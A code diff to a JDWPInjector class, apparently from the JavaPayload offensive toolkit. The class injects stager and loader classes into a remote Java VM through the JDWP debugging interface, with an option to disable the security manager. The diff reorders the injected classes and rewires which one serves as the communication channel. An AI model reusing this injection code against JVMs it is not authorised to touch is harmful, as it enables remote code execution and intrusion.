@@ -107,7 +107,7 @@ public class JDWPInjector extends Injector {
 						final JDWPClassInjector ci = new JDWPClassInjector(tr);
 						for (int i = 0; i < classes.length; i++) {
 							ClassType ct = ci.inject(classes[i], i == classes.length - 1 ? embeddedArgs : null);
-							if (i==0) result = ct;
+							if (i==1) result = ct;
 						}
 						consoleOut.println("== done.");
 						done = true;
@@ -215,8 +215,8 @@ public class JDWPInjector extends Injector {
 		};
 		if (isJDWPTunnelStager) {
 			classes = new Class[] {
-					javapayload.loader.JDWPCommunication.class,
 					javapayload.stager.Stager.class,
+					javapayload.loader.JDWPCommunication.class,
 					classes[1], 
 					javapayload.loader.JDWPLoader.class
 			};
@@ -237,15 +237,19 @@ public class JDWPInjector extends Injector {
 				throw new RuntimeException();
 			}
 		}
-		ClassType firstInjectedClass = inject(vm, classBytes, embeddedArgs.toString(), disableSecurityManager, loader.stageHandler.consoleOut);
+		ClassType secondInjectedClass = inject(vm, classBytes, embeddedArgs.toString(), disableSecurityManager, loader.stageHandler.consoleOut);
 
 		if (isJDWPTunnelStager) {
-			loader.handleAfter(loader.stageHandler.consoleErr, firstInjectedClass);
+			loader.handleAfter(loader.stageHandler.consoleErr, secondInjectedClass);
 		} else if (isPollingTunnelStager) {
-			loader.handleAfter(loader.stageHandler.consoleErr, new JDWPPollingCommunicationInterface(vm, loader.stageHandler.consoleErr));
+			loader.handleAfter(loader.stageHandler.consoleErr, new JDWPPollingCommunicationInterface(secondInjectedClass, loader.stageHandler.consoleErr));
 		} else {
 			vm.dispose();
 			loader.handleAfter(loader.stageHandler.consoleErr, null);
 		}
+	}
+	
+	public Class[] getSupportedExtraArgClasses() {
+		return new Class[] { ClassType.class, PollingTunnel.CommunicationInterface.class, null };
 	}
 }
